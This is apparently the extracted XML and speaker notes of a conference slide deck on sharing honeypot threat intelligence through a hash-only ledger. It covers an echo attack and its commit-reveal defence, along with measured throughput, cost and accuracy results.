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charts/chart1.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charts/chart2.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charts/chart3.xml" ContentType="application/vnd.openxmlformats-officedocument.drawingml.chart+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8d2616a2-b55b-908f-7956-e0f21d48b6c6}">
          <p14:sldIdLst>
            <p14:sldId id="256"/>
            <p14:sldId id="257"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="Background" id="{82f42f73-e4c8-a905-5362-2b1fe5cbf70c}">
          <p14:sldIdLst>
            <p14:sldId id="258"/>
            <p14:sldId id="259"/>
            <p14:sldId id="260"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="The problem" id="{c3d85fe8-b2f4-de16-e162-a761fbe82886}">
          <p14:sldIdLst>
            <p14:sldId id="261"/>
            <p14:sldId id="262"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="Prior work" id="{befb6a93-f9b7-11a8-835d-435755775f37}">
          <p14:sldIdLst>
            <p14:sldId id="263"/>
            <p14:sldId id="264"/>
            <p14:sldId id="265"/>
            <p14:sldId id="266"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="Our design" id="{19cf3af6-5fcf-447c-e3ae-80d1a4b9acfc}">
          <p14:sldIdLst>
            <p14:sldId id="267"/>
            <p14:sldId id="268"/>
            <p14:sldId id="269"/>
            <p14:sldId id="270"/>
            <p14:sldId id="271"/>
            <p14:sldId id="272"/>
            <p14:sldId id="273"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="Results" id="{c0d816ac-ca82-2c55-ab96-73d042989d5d}">
          <p14:sldIdLst>
            <p14:sldId id="274"/>
            <p14:sldId id="275"/>
            <p14:sldId id="276"/>
            <p14:sldId id="277"/>
            <p14:sldId id="278"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="Close" id="{2d9c5d52-13b2-010e-c20e-6f150c4a0101}">
          <p14:sldIdLst>
            <p14:sldId id="279"/>
            <p14:sldId id="28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Shared ledger</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="1FA97A"/>
            </a:solidFill>
            <a:effectLst/>
          </c:spPr>
          <c:invertIfNegative val="0"/>
          <c:dLbls>
            <c:numFmt formatCode="#,##0" sourceLinked="0"/>
            <c:txPr>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:pPr>
                  <a:defRPr b="0" i="0" strike="noStrike" sz="1000" u="none">
                    <a:solidFill>
                      <a:srgbClr val="1F2328"/>
                    </a:solidFill>
                    <a:latin typeface="+mn-lt"/>
                  </a:defRPr>
                </a:pPr>
              </a:p>
            </c:txPr>
            <c:showLegendKey val="0"/>
            <c:showVal val="1"/>
            <c:showCatName val="0"/>
            <c:showSerName val="0"/>
            <c:showPercent val="0"/>
            <c:showBubbleSize val="0"/>
            <c:showLeaderLines val="0"/>
          </c:dLbls>
          <c:cat>
            <c:multiLvlStrRef>
              <c:f>Sheet1!$A$2:$A$6</c:f>
              <c:multiLvlStrCache>
                <c:ptCount val="5"/>
                <c:lvl>
                  <c:pt idx="0">
                    <c:v>1</c:v>
                  </c:pt>
                  <c:pt idx="1">
                    <c:v>2</c:v>
                  </c:pt>
                  <c:pt idx="2">
                    <c:v>4</c:v>
                  </c:pt>
                  <c:pt idx="3">
                    <c:v>8</c:v>
                  </c:pt>
                  <c:pt idx="4">
                    <c:v>16</c:v>
                  </c:pt>
                </c:lvl>
              </c:multiLvlStrCache>
            </c:multiLvlStrRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>Sheet1!$B$2:$B$6</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="5"/>
                <c:pt idx="0">
                  <c:v>119</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>210</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>236</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>253</c:v>
                </c:pt>
                <c:pt idx="4">
                  <c:v>255</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
        </c:ser>
        <c:ser>
          <c:idx val="1"/>
          <c:order val="1"/>
          <c:tx>
            <c:strRef>
              <c:f>Sheet1!$C$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Central hub</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="D9534F"/>
            </a:solidFill>
            <a:effectLst/>
          </c:spPr>
          <c:invertIfNegative val="0"/>
          <c:dLbls>
            <c:numFmt formatCode="#,##0" sourceLinked="0"/>
            <c:txPr>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:pPr>
                  <a:defRPr b="0" i="0" strike="noStrike" sz="1000" u="none">
                    <a:solidFill>
                      <a:srgbClr val="1F2328"/>
                    </a:solidFill>
                    <a:latin typeface="+mn-lt"/>
                  </a:defRPr>
                </a:pPr>
              </a:p>
            </c:txPr>
            <c:showLegendKey val="0"/>
            <c:showVal val="1"/>
            <c:showCatName val="0"/>
            <c:showSerName val="0"/>
            <c:showPercent val="0"/>
            <c:showBubbleSize val="0"/>
            <c:showLeaderLines val="0"/>
          </c:dLbls>
          <c:cat>
            <c:multiLvlStrRef>
              <c:f>Sheet1!$A$2:$A$6</c:f>
              <c:multiLvlStrCache>
                <c:ptCount val="5"/>
                <c:lvl>
                  <c:pt idx="0">
                    <c:v>1</c:v>
                  </c:pt>
                  <c:pt idx="1">
                    <c:v>2</c:v>
                  </c:pt>
                  <c:pt idx="2">
                    <c:v>4</c:v>
                  </c:pt>
                  <c:pt idx="3">
                    <c:v>8</c:v>
                  </c:pt>
                  <c:pt idx="4">
                    <c:v>16</c:v>
                  </c:pt>
                </c:lvl>
              </c:multiLvlStrCache>
            </c:multiLvlStrRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>Sheet1!$C$2:$C$6</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="5"/>
                <c:pt idx="0">
                  <c:v>1478</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>1660</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>1692</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>1712</c:v>
                </c:pt>
                <c:pt idx="4">
                  <c:v>1737</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
        </c:ser>
        <c:dLbls>
          <c:numFmt formatCode="#,##0" sourceLinked="0"/>
          <c:txPr>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:pPr>
                <a:defRPr b="0" i="0" strike="noStrike" sz="1000" u="none">
                  <a:solidFill>
                    <a:srgbClr val="1F2328"/>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title>
          <c:tx>
            <c:rich>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:pPr>
                  <a:defRPr sz="1100" b="0" i="0" u="none" strike="noStrike">
                    <a:solidFill>
                      <a:srgbClr val="6B7280"/>
                    </a:solidFill>
                    <a:latin typeface="+mn-lt"/>
                  </a:defRPr>
                </a:pPr>
                <a:r>
                  <a:rPr sz="1100" b="0" i="0" u="none" strike="noStrike">
                    <a:solidFill>
                      <a:srgbClr val="6B7280"/>
                    </a:solidFill>
                    <a:latin typeface="+mn-lt"/>
                  </a:rPr>
                  <a:t>Concurrent writer nodes (N)</a:t>
                </a:r>
              </a:p>
            </c:rich>
          </c:tx>
          <c:layout/>
          <c:overlay val="0"/>
        </c:title>
        <c:numFmt formatCode="General" sourceLinked="1"/>
        <c:majorTickMark val="out"/>
        <c:minorTickMark val="none"/>
        <c:tickLblPos val="low"/>
        <c:spPr>
          <a:ln w="12700" cap="flat">
            <a:noFill/>
            <a:prstDash val="solid"/>
            <a:round/>
          </a:ln>
        </c:spPr>
        <c:txPr>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1100" b="0" i="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="6B7280"/>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5E7EB"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
              <a:round/>
            </a:ln>
          </c:spPr>
        </c:majorGridlines>
        <c:title>
          <c:tx>
            <c:rich>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:pPr>
                  <a:defRPr sz="1100" b="0" i="0" u="none" strike="noStrike">
                    <a:solidFill>
                      <a:srgbClr val="6B7280"/>
                    </a:solidFill>
                    <a:latin typeface="+mn-lt"/>
                  </a:defRPr>
                </a:pPr>
                <a:r>
                  <a:rPr sz="1100" b="0" i="0" u="none" strike="noStrike">
                    <a:solidFill>
                      <a:srgbClr val="6B7280"/>
                    </a:solidFill>
                    <a:latin typeface="+mn-lt"/>
                  </a:rPr>
                  <a:t>Events per second</a:t>
                </a:r>
              </a:p>
            </c:rich>
          </c:tx>
          <c:layout/>
          <c:overlay val="0"/>
        </c:title>
        <c:numFmt formatCode="#,##0" sourceLinked="0"/>
        <c:majorTickMark val="out"/>
        <c:minorTickMark val="none"/>
        <c:tickLblPos val="nextTo"/>
        <c:spPr>
          <a:ln w="12700" cap="flat">
            <a:noFill/>
            <a:prstDash val="solid"/>
            <a:round/>
          </a:ln>
        </c:spPr>
        <c:txPr>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1000" b="0" i="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="6B7280"/>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1F2328"/>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F2328"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="1F2328"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Gas per IOC vs. hashes per transaction (Merkle batching)</a:t>
            </a:r>
          </a:p>
        </c:rich>
      </c:tx>
      <c:layout/>
      <c:overlay val="0"/>
    </c:title>
    <c:autoTitleDeleted val="0"/>
    <c:plotArea>
      <c:layout/>
      <c:barChart>
        <c:barDir val="col"/>
        <c:grouping val="clustered"/>
        <c:varyColors val="0"/>
        <c:ser>
          <c:idx val="0"/>
          <c:order val="0"/>
          <c:tx>
            <c:strRef>
              <c:f>Sheet1!$B$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Gas per IOC</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="1FA97A"/>
            </a:solidFill>
            <a:effectLst/>
          </c:spPr>
          <c:invertIfNegative val="0"/>
          <c:dLbls>
            <c:numFmt formatCode="#,##0" sourceLinked="0"/>
            <c:txPr>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:pPr>
                  <a:defRPr b="0" i="0" strike="noStrike" sz="1000" u="none">
                    <a:solidFill>
                      <a:srgbClr val="1F2328"/>
                    </a:solidFill>
                    <a:latin typeface="+mn-lt"/>
                  </a:defRPr>
                </a:pPr>
              </a:p>
            </c:txPr>
            <c:showLegendKey val="0"/>
            <c:showVal val="1"/>
            <c:showCatName val="0"/>
            <c:showSerName val="0"/>
            <c:showPercent val="0"/>
            <c:showBubbleSize val="0"/>
            <c:showLeaderLines val="0"/>
          </c:dLbls>
          <c:cat>
            <c:multiLvlStrRef>
              <c:f>Sheet1!$A$2:$A$8</c:f>
              <c:multiLvlStrCache>
                <c:ptCount val="7"/>
                <c:lvl>
                  <c:pt idx="0">
                    <c:v>B = 1</c:v>
                  </c:pt>
                  <c:pt idx="1">
                    <c:v>B = 2</c:v>
                  </c:pt>
                  <c:pt idx="2">
                    <c:v>B = 4</c:v>
                  </c:pt>
                  <c:pt idx="3">
                    <c:v>B = 8</c:v>
                  </c:pt>
                  <c:pt idx="4">
                    <c:v>B = 16</c:v>
                  </c:pt>
                  <c:pt idx="5">
                    <c:v>B = 32</c:v>
                  </c:pt>
                  <c:pt idx="6">
                    <c:v>B = 64</c:v>
                  </c:pt>
                </c:lvl>
              </c:multiLvlStrCache>
            </c:multiLvlStrRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>Sheet1!$B$2:$B$8</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="7"/>
                <c:pt idx="0">
                  <c:v>21552</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>10777</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>5388</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>2694</c:v>
                </c:pt>
                <c:pt idx="4">
                  <c:v>1347</c:v>
                </c:pt>
                <c:pt idx="5">
                  <c:v>674</c:v>
                </c:pt>
                <c:pt idx="6">
                  <c:v>337</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
        </c:ser>
        <c:dLbls>
          <c:numFmt formatCode="#,##0" sourceLinked="0"/>
          <c:txPr>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:pPr>
                <a:defRPr b="0" i="0" strike="noStrike" sz="1000" u="none">
                  <a:solidFill>
                    <a:srgbClr val="1F2328"/>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6B7280"/>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5E7EB"/>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6B728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Precision</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="C9CED6"/>
            </a:solidFill>
            <a:effectLst/>
          </c:spPr>
          <c:invertIfNegative val="0"/>
          <c:dLbls>
            <c:numFmt formatCode="0.00" sourceLinked="0"/>
            <c:txPr>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:pPr>
                  <a:defRPr b="0" i="0" strike="noStrike" sz="1000" u="none">
                    <a:solidFill>
                      <a:srgbClr val="1F2328"/>
                    </a:solidFill>
                    <a:latin typeface="+mn-lt"/>
                  </a:defRPr>
                </a:pPr>
              </a:p>
            </c:txPr>
            <c:showLegendKey val="0"/>
            <c:showVal val="1"/>
            <c:showCatName val="0"/>
            <c:showSerName val="0"/>
            <c:showPercent val="0"/>
            <c:showBubbleSize val="0"/>
            <c:showLeaderLines val="0"/>
          </c:dLbls>
          <c:cat>
            <c:multiLvlStrRef>
              <c:f>Sheet1!$A$2:$A$5</c:f>
              <c:multiLvlStrCache>
                <c:ptCount val="4"/>
                <c:lvl>
                  <c:pt idx="0">
                    <c:v>Exact record</c:v>
                  </c:pt>
                  <c:pt idx="1">
                    <c:v>Payload only</c:v>
                  </c:pt>
                  <c:pt idx="2">
                    <c:v>Template</c:v>
                  </c:pt>
                  <c:pt idx="3">
                    <c:v>/24 + template</c:v>
                  </c:pt>
                </c:lvl>
              </c:multiLvlStrCache>
            </c:multiLvlStrRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>Sheet1!$B$2:$B$5</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="4"/>
                <c:pt idx="0">
                  <c:v>1</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>0.5644</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>0.1542</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>1</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
        </c:ser>
        <c:ser>
          <c:idx val="1"/>
          <c:order val="1"/>
          <c:tx>
            <c:strRef>
              <c:f>Sheet1!$C$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Recall</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="8A919C"/>
            </a:solidFill>
            <a:effectLst/>
          </c:spPr>
          <c:invertIfNegative val="0"/>
          <c:dLbls>
            <c:numFmt formatCode="0.00" sourceLinked="0"/>
            <c:txPr>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:pPr>
                  <a:defRPr b="0" i="0" strike="noStrike" sz="1000" u="none">
                    <a:solidFill>
                      <a:srgbClr val="1F2328"/>
                    </a:solidFill>
                    <a:latin typeface="+mn-lt"/>
                  </a:defRPr>
                </a:pPr>
              </a:p>
            </c:txPr>
            <c:showLegendKey val="0"/>
            <c:showVal val="1"/>
            <c:showCatName val="0"/>
            <c:showSerName val="0"/>
            <c:showPercent val="0"/>
            <c:showBubbleSize val="0"/>
            <c:showLeaderLines val="0"/>
          </c:dLbls>
          <c:cat>
            <c:multiLvlStrRef>
              <c:f>Sheet1!$A$2:$A$5</c:f>
              <c:multiLvlStrCache>
                <c:ptCount val="4"/>
                <c:lvl>
                  <c:pt idx="0">
                    <c:v>Exact record</c:v>
                  </c:pt>
                  <c:pt idx="1">
                    <c:v>Payload only</c:v>
                  </c:pt>
                  <c:pt idx="2">
                    <c:v>Template</c:v>
                  </c:pt>
                  <c:pt idx="3">
                    <c:v>/24 + template</c:v>
                  </c:pt>
                </c:lvl>
              </c:multiLvlStrCache>
            </c:multiLvlStrRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>Sheet1!$C$2:$C$5</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="4"/>
                <c:pt idx="0">
                  <c:v>0.275</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>0.6625</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>0.15</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>0.8125</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
        </c:ser>
        <c:ser>
          <c:idx val="2"/>
          <c:order val="2"/>
          <c:tx>
            <c:strRef>
              <c:f>Sheet1!$D$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>F1</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="1FA97A"/>
            </a:solidFill>
            <a:effectLst/>
          </c:spPr>
          <c:invertIfNegative val="0"/>
          <c:dLbls>
            <c:numFmt formatCode="0.00" sourceLinked="0"/>
            <c:txPr>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:pPr>
                  <a:defRPr b="0" i="0" strike="noStrike" sz="1000" u="none">
                    <a:solidFill>
                      <a:srgbClr val="1F2328"/>
                    </a:solidFill>
                    <a:latin typeface="+mn-lt"/>
                  </a:defRPr>
                </a:pPr>
              </a:p>
            </c:txPr>
            <c:showLegendKey val="0"/>
            <c:showVal val="1"/>
            <c:showCatName val="0"/>
            <c:showSerName val="0"/>
            <c:showPercent val="0"/>
            <c:showBubbleSize val="0"/>
            <c:showLeaderLines val="0"/>
          </c:dLbls>
          <c:cat>
            <c:multiLvlStrRef>
              <c:f>Sheet1!$A$2:$A$5</c:f>
              <c:multiLvlStrCache>
                <c:ptCount val="4"/>
                <c:lvl>
                  <c:pt idx="0">
                    <c:v>Exact record</c:v>
                  </c:pt>
                  <c:pt idx="1">
                    <c:v>Payload only</c:v>
                  </c:pt>
                  <c:pt idx="2">
                    <c:v>Template</c:v>
                  </c:pt>
                  <c:pt idx="3">
                    <c:v>/24 + template</c:v>
                  </c:pt>
                </c:lvl>
              </c:multiLvlStrCache>
            </c:multiLvlStrRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>Sheet1!$D$2:$D$5</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="4"/>
                <c:pt idx="0">
                  <c:v>0.424</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>0.6073</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>0.152</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>0.8902</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
        </c:ser>
        <c:dLbls>
          <c:numFmt formatCode="0.00" sourceLinked="0"/>
          <c:txPr>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:pPr>
                <a:defRPr b="0" i="0" strike="noStrike" sz="1000" u="none">
                  <a:solidFill>
                    <a:srgbClr val="1F2328"/>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6B7280"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:defRPr>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </c:txPr>
        <c:crossAx val="2094734552"/>
        <c:crosses val="autoZero"/>
        <c:auto val="1"/>
        <c:lblAlgn val="ctr"/>
        <c:noMultiLvlLbl val="1"/>
      </c:catAx>
      <c:valAx>
        <c:axId val="2094734552"/>
        <c:scaling>
          <c:orientation val="minMax"/>
          <c:max val="1.1"/>
          <c:min val="0"/>
        </c:scaling>
        <c:delete val="0"/>
        <c:axPos val="l"/>
        <c:majorGridlines>
          <c:spPr>
            <a:ln w="9525" cap="flat">
              <a:solidFill>
                <a:srgbClr val="E5E7EB"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
              <a:round/>
            </a:ln>
          </c:spPr>
        </c:majorGridlines>
        <c:numFmt formatCode="0.00" sourceLinked="0"/>
        <c:majorTickMark val="out"/>
        <c:minorTickMark val="none"/>
        <c:tickLblPos val="nextTo"/>
        <c:spPr>
          <a:ln w="12700" cap="flat">
            <a:noFill/>
            <a:prstDash val="solid"/>
            <a:round/>
          </a:ln>
        </c:spPr>
        <c:txPr>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1000" b="0" i="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="6B7280"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:defRPr>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </c:txPr>
        <c:crossAx val="2094734554"/>
        <c:crosses val="autoZero"/>
        <c:crossBetween val="between"/>
        <c:majorUnit val="0.25"/>
      </c:valAx>
      <c:spPr>
        <a:noFill/>
        <a:ln>
          <a:noFill/>
        </a:ln>
        <a:effectLst/>
      </c:spPr>
    </c:plotArea>
    <c:legend>
      <c:legendPos val="t"/>
      <c:overlay val="0"/>
      <c:txPr>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr sz="1100">
              <a:solidFill>
                <a:srgbClr val="1F2328"/>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(SISIR)
Good morning, everyone. I'm Sisir Reddy Nellore, and this is Suhas Reddy Annem. This work was done with our faculty advisor, Radhika G, at Amrita Vishwa Vidyapeetham, Coimbatore.
Our paper is "Hub-less Cross-Honeypot Threat Intelligence." In simple words, it asks how security sensors owned by different organizations can share what they see about attacks, without all of them trusting one central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(SISIR)  [SKIP IF SHORT]
Here's the plan. I'll start with some background, then explain the problem we're solving, what earlier work has done, what makes our approach different, and how our design works. After that, Suhas will show how we handle varied attacks and cheating, and walk you through the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(SISIR)  [SKIP IF SHORT]
First, what is a honeypot? It's a decoy computer. It looks like a real server, but it has no real users, so anyone who connects to it is almost certainly an attacker.
The honeypot quietly records everything: where the attacker came from, what commands they typed, and what files they tried to download. That record is valuable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(SISIR)  [SKIP IF SHORT]
Each piece of that evidence is called an indicator of compromise, or IOC. It might be the attacker's IP address, the command they ran, or a session token their tool uses.
Here's the key idea for this talk. If two honeypots in two different organizations see the same indicator, it is very likely the same attack campaign. Confirming an attack from more than one independent source is called corroboration.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(SISIR)
Why does that matter? Because attacks are rarely aimed at just one target. Botnets and mass scanners hit everyone they can reach.
Each organization sees only its own piece. Organization A doesn't know that B and C are seeing the same thing. The full picture appears only when you combine their views.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(SISIR)
Today, the standard way to combine views is a central hub: a threat-intelligence platform such as MISP, using the STIX and TAXII standards. Every sensor sends its data to one server, and that server does the matching.
It works, but it creates three problems. Everyone has to trust the hub not to lose, change or hide their data. If the hub goes down, correlation stops. And it's a single, attractive target. For honeypots that's especially awkward: the decoys are meant to be attacked, but the hub is exposed to the same attackers.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(SISIR)
So here is the problem we solve: can honeypots run by organizations that don't trust each other spot shared attacks, without any central server?
We set four requirements. There is no trusted middleman. A new honeypot can join at any time and catch up on its own. Fake or copied reports must not count as evidence. And the costs must be measured, not assumed.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(SISIR)  [SKIP IF SHORT]
Others have worked on this. On the left are the central and federated platforms. MISP can federate, but its servers sync in pairs and new members have to be admitted. STIX and TAXII define a common data format and a client–server transport.
On the right are blockchain-based designs: TRADE, TrustShare, the framework by Dunnett and colleagues, BFLS, and the trust-aware honeypot ledger by Otoum and colleagues. They all use a blockchain, but they also put a lot of logic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(SISIR)  [SKIP IF SHORT]
That is where they fall short for our problem. First, smart contracts for reputation, access and membership are extra code that everyone has to trust, and they make it hard to tell what the blockchain itself contributes.
Second, joining usually needs permission or configuration. Third, the designs we compared against don't report measured fees, speed limits, or what happens when a participant cheats.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(SISIR)
This table, from our paper, puts it side by side. Central platforms need a trusted coordinator. Blockchain designs remove the coordinator, but they rely on on-chain logic, none of them lets a new node build its view from the ledger alone, and none reports measured attacks and costs.
Ours is the only row that ticks all three, with no on-chain logic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(SISIR)
So what makes this paper unique? One: we put nothing on the chain except fingerprints. No contracts, no registry, and no messages between nodes.
Two: any newcomer rebuilds the full picture from the ledger history alone. Three: we define a new cheating attack, the echo attack, and block it with commit–reveal. And four: every number is measured on a live chain with up to 16 nodes, against a real centralized hub, and our cost formulas match the measurements exactly.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(SISIR)
Here's the core idea as an analogy. Picture a public notice board that nobody owns and nothing can be erased from. Each honeypot pins up a fingerprint of what it saw, signed with its own name.
If the same fingerprint shows up from several different honeypots, like the three highlighted here, that's a corroborated campaign. Let me show you how it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(SISIR)  [SKIP IF SHORT]
The fingerprint is a hash, computed with SHA-256. You feed in any text, like this attack command, and you get back a fixed-length code.
Three properties matter. The same input always gives the same hash, so two honeypots that see the same thing produce the same code. Change one character and the hash is completely different. And the hash doesn't show the original text, so we never put raw attack data on the ledger.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(SISIR)
Here are the two models side by side. On the left is the usual hub: raw data flows in, and the hub is the single point of trust and failure.
On the right is our design. Each honeypot posts a small tag, its node ID plus the hash, to a shared, append-only ledger. There's no smart contract and no owner. Anyone reading the ledger can work out, for each hash, which nodes saw it. And P4, a node that joins later, rebuilds the same view from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(SISIR)  [SKIP IF SHORT]
Step by step: a honeypot observes an attack. It normalizes the record, keeping only the fields that define "the same" indicator. It hashes that. It posts the tag, its ID plus the hash, to the ledger. Then any reader counts: if k or more different nodes posted the same hash, it is corroborated.
Notice that no node ever talks to another. The ledger is the only thing they share.
Now Suhas will take you through how we make this work against real, messy attacks, and what we measured.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2 (SUHAS)  [SKIP IF SHORT]
Thanks, Sisir. Step two, normalizing, turns out to matter a lot. Real attackers change small details for each target: a session token here, a source IP there. So what counts as the same indicator? We tested four options, called keying functions.
Hash the exact record and you're never wrong, but you miss varied attacks. Hash only the command, and common commands from unrelated attackers collide. Blank out tokens and IPs, which is the template, and you merge different campaigns that use the same tool. Or combine the attacker's /24 network with the template. We'll see the numbers shortly.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2 (SUHAS)  [SKIP IF SHORT]
Now, a threat we identified. Because the board is public, a cheater can simply read it and re-post every fingerprint under its own name. Suddenly everything looks like it was seen by two honeypots.
We call this the echo attack. In our test, it falsely corroborated all 120 single-node reports in about one second.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2 (SUHAS)
Our fix works like a sealed-bid auction. First, each node commits: it posts a salted hash that reveals nothing. Later, it reveals the salt and the hash. A reader counts a node only if its commitment came before anyone revealed that hash.
The echo node only learns a hash from someone else's reveal, so it is always too late. The cost is two transactions per indicator instead of one. Honest nodes that see an attack late simply commit it in the next round, which we call an epoch.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2 (SUHAS)  [SKIP IF SHORT]
How did we test it? On a live Ethereum-compatible chain, Ganache, with 1 to 16 honeypot nodes writing at the same time, five repetitions each, and 95 percent confidence intervals. We also built a real centralized hub in the same test harness, so the comparison is fair.
Eight experiments cover scaling, cost, bootstrap, accuracy, attacks, tamper detection, the hub baseline and propagation. One run of about three minutes produced every number in the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2 (SUHAS)
First, speed. The ledger, in green, levels off at about 255 events per second from eight writers onward, because the chain processes transactions one at a time. The hub, in red, reaches 1,737, which is 6.8 times faster.
We report this openly: it is the measured price of removing the trusted middleman. Median latency stays around 12 milliseconds, but the slowest one percent grows to about a second once the chain is full.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2 (SUHAS)  [SKIP IF SHORT]
Next, cost. Each indicator costs 22,120 gas, which is exactly what the Ethereum fee formula predicts. Batching 64 hashes under one Merkle root brings it down to 337 gas per indicator.
And a new node catches up at about 3 milliseconds per block, growing in a straight line with the length of the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2 (SUHAS)
Accuracy depends on the keying function. Exact hashing is always correct, but it finds only 27.5 percent of campaigns that vary per target. The template key merges unrelated attacks and scores lowest, with an F1 of 0.15. The best was the /24 network plus template: 100 percent precision, 81 percent recall, and an F1 of 0.89.
The lesson is that the ledger doesn't lock you into one key. Nodes can pick the one that suits their traffic, or post under several.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2 (SUHAS)
On security, commit–reveal cut the echo attack from 100 percent to zero, at twice the gas, and every genuinely shared hash was still corroborated.
In a Sybil attack, one attacker creates many fake identities. Fake reports pass only if the attacker controls at least k identities, so this belongs on a permissioned chain. And when we edited records in a node's local log after posting, we caught 500 out of 500, with zero false alarms on 500 untouched records.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2 (SUHAS)
To sum up: a ledger that carries only fingerprints can replace the central hub for honeypots that don't trust each other. Compared with prior work, we use no on-chain logic, newcomers need no permission to catch up, we defend against copied reports, and every cost is measured.
Our limits: the test chain has no consensus delay, so real deployments will be slower. The accuracy data is synthetic, and Sybil resistance needs controlled identities. Next, we want to test on a real consortium chain, tune the epoch length, and use captured attack traffic.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2 (SUHAS)
Thank you for listening. We're happy to take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bg1"/>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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" indent="0" marL="0">
              <a:buNone/>
